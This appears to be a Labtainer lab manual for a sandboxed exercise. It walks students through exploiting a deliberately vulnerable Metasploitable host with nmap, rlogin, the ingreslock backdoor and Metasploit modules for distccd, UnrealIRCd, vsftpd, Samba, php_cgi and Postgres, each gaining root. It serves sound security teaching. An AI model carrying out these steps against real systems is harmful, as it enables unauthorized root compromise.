![](media/b80e0eacca6dad9d42b5dc3545946591.png)

Using Metasploit
=================================

Overview
========

This Labtainer exercise explores the use of the metasploit tool which is
installed on a Kali Linux system (attacker) and is meant to learn simple
penetration skills on a purposely vulnerable metasploitable host (victim).

Note: the attacker computer is configured to have IP address 192.168.1.3 while
the victim computer is 192.168.1.2

Lab Environment
===============

Once you have logged into your range account and accessed your Labtainer-VM,
open a terminal window.

Navigate to the “labtainer-student” directory and start the lab using the
command:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$  labtainer metasploit
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-   The resulting virtual terminal is connected to the attacker computer.
-   Links to this lab manual will be displayed if you wish to view the prompt
    from within your VM


Lab Tasks
=====

Verify connectivity between attacker and victim
=====

- A simple ping from the attacker system will be sufficient.

```
ping 192.168.1.2
```

Get a list of vulnerable services on the victim
=====

- An 'nmap' scan of the victim will be sufficient.

```
nmap -p0-65535 192.168.1.2
```

Walk-Thru for Vulnerably configured rlogin service (port 513)
=====

- Remote login to the victim (with root privilege)
```
rlogin -l root 192.168.1.2
```

- Display a 'root' file
```
cat /root/filetoview.txt
```

Walk-Thru for Vulnerable ingreslock service (port 1524)
=====

- Use telnet to access ingreslock service and obtain root privilege
```
telnet 192.168.1.2 1524
```

- Display root file as above

Walk-Thru for Vulnerable distccd service (port 3632)
=====

- Start Metasploit console
```
sudo msfconsole
```

Note you will see a warning about a missing database, you can ignore that.

- Search for distccd exploit:
```
search distccd
```

- Use the exploit:
```
use exploit/unix/misc/distcc_exec
```

- View options related to exploit:
```
options
```

- Set the 'RHOST' option:
```
set RHOST 192.168.1.2
```

- Run the exploit:
```
exploit
```

Note: when the exploit has succeeded, no prompt is shown but a shell is created.

- Display the root file as above.

Your Turn! Exploit the Vulnerable IRC daemon (port 6667)
=====

- Search for unreal_ircd exploit.

- Use the exploit.

- View and set options as necessary (RHOST option) run the exploit and display
root file.

Exploit the Vulnerable VSFtpd service (port 21)
=====

- Search for vsftpd_234.

- Use the exploit.

- View and set options as necessary (RHOST option), run the exploit and display
root file.

Exploit the Vulnerable Samba service (port 139)
=====

- Search for samba usermap_script.

- Use the exploit.

- View and set options as necessary (RHOST option), run the exploit and display
root file.

Exploit the Vulnerable HTTP (php) service (port 80)
=====

- Search for php_cgi.

- Use the exploit.

- View and set options as necessary (RHOST option) run the exploit.

Note: when the exploit is succeeded a 'meterpreter' prompt is shown.

- From meterpreter prompt, drop to a shell:

```
shell
```

- Display the root file.


Expolit the Vulnerable Postgres service (port 5432)
=====

- Search for postgres_payload.

- Use the exploit.

- View and set options as necessary (RHOST option).

- run the exploit.

Note: when the exploit is succeeded a 'meterpreter' prompt is shown.


- From meterpreter prompt, drop to a shell.

- Display root file.

Stop the Labtainer (Bonus lab)
=====

When the lab is completed, or you'd like to stop working for a while, run

```
$ stoplab
```

You can always restart the Labtainer to continue your work. 

